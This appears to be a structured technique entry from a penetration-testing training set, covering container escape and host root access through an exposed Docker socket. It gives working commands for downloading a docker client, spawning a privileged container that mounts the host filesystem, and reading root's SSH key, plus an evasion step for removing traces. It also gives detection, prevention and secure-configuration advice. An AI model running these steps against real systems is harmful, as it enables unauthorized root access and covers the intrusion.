SSH to the host with the recovered key

notes: A container with /var/run/docker.sock (or an app socket) bind-mounted is game over: talk to the Docker API to spawn a new privileged container mounting host / and read root's files or SSH key.

name: Privileged Groups - Exposed Docker Socket (in-container)
description: A docker.sock mounted inside a container lets you talk to the host Docker daemon. Upload a docker client, spawn a privileged container mounting host /, and read the host's root SSH key.

steps.label: 1. Get a docker client into the container
steps.command:
wget https://master.dockerproject.com/linux/x86_64/docker -O docker
chmod +x docker
/tmp/docker -H unix:///app/docker.sock ps

defense.why_it_works: The Docker socket (/var/run/docker.sock) provides full Docker daemon control. If the socket is accessible to a non-root user (mounted in a container, world-writable, or group-accessible), they can use it to create a new privileged container mounting the host root filesystem, effectively gaining root access to the host from within the container.
defense.prerequisites: Access to /var/run/docker.sock or a Docker socket in a container. Docker daemon running. docker binary available (or downloadable).
defense.impact: Full root access to the host filesystem via a privileged container with host root mounted. Can read /etc/shadow, SSH keys, write cron jobs, or spawn a root shell with chroot.
defense.detection: Non-root process accessing /var/run/docker.sock. New container spawned with --privileged flag and host volume mount. Docker audit logs showing unexpected container creation. EDR: docker run command from non-admin user.
defense.artifacts: Docker daemon log (new container creation with host volume) | Auditd: open(/var/run/docker.sock) by non-root | Container runtime: privileged container with / mount
defense.prevention: Never expose /var/run/docker.sock in containers (avoid -v /var/run/docker.sock:/var/run/docker.sock). Restrict docker group membership -- being in the docker group is equivalent to root. Use rootless Docker or Podman instead. Apply Docker socket access controls (socket proxy with minimal permissions).
defense.misconfiguration: Docker socket exposed in a container (mounted as volume). Or non-root user added to the 'docker' group, giving equivalent root access via: docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash.
defense.vulnerable_config:
# Container started with socket mounted
docker run -v /var/run/docker.sock:/var/run/docker.sock ...

# Or: non-root user in docker group
id
# uid=1000(htb-student) gid=1000(htb-student) groups=...,999(docker)
defense.secure_config:
# Remove user from docker group
gpasswd -d htb-student docker

# Use rootless Docker
# Install: dockerd-rootless-setuptool.sh install

# If socket sharing needed, use socket proxy (haproxy/socat)
# with allowlist of specific docker API endpoints only
defense.evasion: Use a single container/mount escape that reads what you need and exits; remove images/containers you created (docker rmi / lxc delete); avoid leaving a privileged container running.
